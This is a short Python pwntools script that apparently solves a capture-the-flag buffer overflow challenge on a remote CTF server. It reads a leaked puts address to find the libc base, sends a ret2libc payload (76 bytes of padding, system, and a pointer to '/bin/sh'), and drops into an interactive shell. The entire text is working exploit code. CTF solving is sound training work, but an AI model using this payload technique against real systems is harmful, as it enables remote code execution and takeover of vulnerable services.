#!/usr/bin/env python2
from pwn import *

elf = ELF('./chall')
libc = ELF('./libc.so.6')
local = False

if local:
    conn = elf.process() # to interact with the chall elf
else :
    host = 'bof2.hackini24.shellmates.club'
    port = 443
    conn = remote(host,port)  # to connect to the ctf server 

conn.recvuntil("Gift for ya: ")
puts = conn.recvline().strip()
libc.address = int(puts,16) - libc.symbols['puts']

padding = "A"*76
system = libc.symbols["system"]
ret_add = "AAAA"
bin_sh = libc.search("/bin/sh").next()

payload = flat(padding , system , ret_add , bin_sh)
conn.sendline(payload)
conn.interactive()


conn.close()
